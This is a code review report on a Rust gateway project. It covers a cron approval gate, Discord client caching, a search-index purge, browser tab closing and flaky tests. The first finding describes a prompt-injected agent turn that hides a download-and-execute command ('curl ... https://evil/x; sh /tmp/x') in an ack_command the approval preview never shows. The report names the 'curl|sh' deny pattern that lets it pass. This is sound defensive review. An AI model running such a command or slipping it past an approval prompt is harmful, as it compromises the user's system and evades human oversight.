# tools review

### [P1] Cron approval prompt shows only a 120-char preview of the script and never shows `ack_command`; the "Always" grant keys on that preview
- Location: /Users/indo/code/project/omon-gateway/src/tools/cron.rs:256-270 (`requires_approval`; `commands.first()` at 265, `take(120)` at 266), with `shell_commands` at 110-116 and the registry's key derivation in /Users/indo/code/project/omon-gateway/src/tools/mod.rs:149-157
- Trigger 1: A prompt-injected turn calls `cron add` with `script: "echo ok"` plus `ack_command: "curl -o /tmp/x https://evil/x; sh /tmp/x"`. The reason string contains only the first non-empty of script/ack_command, so the human sees "echo ok". `check_cron_script` blocks only hardline commands, deny globs, and patterns like `curl|sh`, so a two-step payload passes. The ack runs unattended through `sh -c` after delivery.
- Trigger 2: A long script whose first 120 characters are benign and padded, with the real payload after position 120, is previewed truncated.
- Trigger 3: The grant key is `sha256(name, reason)` (mod.rs:149-157), and the reason contains only the preview. Approving "Always" or "Session" once for `script: "echo ok"` therefore auto-approves any later add or update with the same first script but a different `ack_command`, or the same 120-char prefix but a different tail.
- Impact: The approval gate added this round does not cover what actually runs unattended, so a user can approve text that differs from the stored command.
- Fix: Include every non-empty shell field in the reason, labelled (`script=...; ack_command=...`), with no truncation of what is hashed. If the displayed text must be shortened, hash the full commands into the key and show a truncated preview separately.

### [P1] Skipping failed tokens in `clients()` makes the exclusion permanent, because `OnceCell` caches the partial success
- Location: /Users/indo/code/project/omon-gateway/src/tools/message_context.rs:484-526 (skip at 496-499), with `http_for_session` at 528-541
- Trigger: With `DISCORD_BOT_TOKENS=A,B`, the first `message_context` call coincides with a transient failure of `get_current_user` for B (network blip, 5xx, rate limit). B is skipped with a warn and `Ok(DiscordClientSet{A only})` is stored.
- Impact:
  - `OnceCell::get_or_try_init` caches only success. Before this fix, one failure returned `Err` and the next call retried.
  - Now every session from bot B gets "no Discord HTTP client for session bot identity B" until the process restarts.
  - If A is the one that fails, `default_bot_id` silently becomes B, so sessions without a `bot_id` use the wrong bot's HTTP client.
- Fix: Fail the init when any token fails for a transient reason, or keep per-token lazy `OnceCell`s so a failed token is retried on the next call. Only skip tokens that fail permanently (401/403).

### [P1] Keying thread messages by thread id breaks the session-delete purge in migration 0042
- Location: /Users/indo/code/project/omon-gateway/src/storage/message_search.rs:238-241 (ingress `channel_id = thread_id`), against /Users/indo/code/project/omon-gateway/migrations/0042_message_search_cleanup.sql:4-15 (`message_search_session_bd` deletes `WHERE channel_id = old.channel_id`)
- Trigger: Delete a thread session, for example the dashboard's `DELETE FROM sessions WHERE session_key = ?` at /Users/indo/code/project/omon-gateway/src/dashboard.rs:1215.
  - The `sessions` row carries `channel_id` = the parent channel (the key built at /Users/indo/code/project/omon-gateway/src/discord/adapter.rs:1471-1477).
  - The trigger purges only documents whose `channel_id` is the parent.
  - Ingress and REST documents for that thread now live under `channel_id = <thread id>`, so they are not purged.
- Impact: The deleted session's message content stays in `message_search_documents` and stays searchable by thread id. This defeats the purpose of the 0042 trigger, and it is a regression because ingress thread rows used to be keyed by the parent.
- Fix: In the trigger, match `channel_id IN (old.channel_id, COALESCE(old.thread_id, old.channel_id))`. Apply the same change to the `message_search_transcript_ad` EXISTS clause (lines 24-27) if ingress rows should follow transcript deletes.

### [P2] `snapshot` closes a user's tab on any `ensure_public_final_url` error, including a transient DNS failure
- Location: /Users/indo/code/project/omon-gateway/src/tools/browser.rs:360 (the snapshot arm; candidate loop with `is_err()` then `close_tab`)
- Trigger: An owned tab is on a hostname name, and `lookup_host` times out or fails (offline blip) during `snapshot`.
- Impact: The tab is closed and its page state is lost, although nothing indicates an internal destination. This is fail-closed, but destructive.
- Fix: Close only when the error is the internal-address refusal. For resolver errors, omit the page from the result without closing it.

### [P2] New and updated tests have environment dependencies
- Location: /Users/indo/code/project/omon-gateway/src/tools/browser.rs:616-682 (tests), /Users/indo/code/project/omon-gateway/src/tools/file.rs:494-500 and 531-557
- Details:
  - The browser tests navigate to `https://example.com/...`. `ensure_public_destination` now runs it up to `settle_max_polls + 1` times through real `lookup_host`, so they need working external DNS.
  - `test_read_oversized_file_is_bounded` does `set_len(1 << 50)`, which fails (EFBIG) on ext4-backed temp dirs (16 TiB limit) but works on APFS and tmpfs.
  - `search_skips_unreadable_entries_instead_of_aborting` relies on mode 000 being unreadable, so it fails when run as root.
- Fix: Use a literal public IP in the browser tests, a smaller sparse size (for example 1 << 40), and skip the permission test when euid is 0.
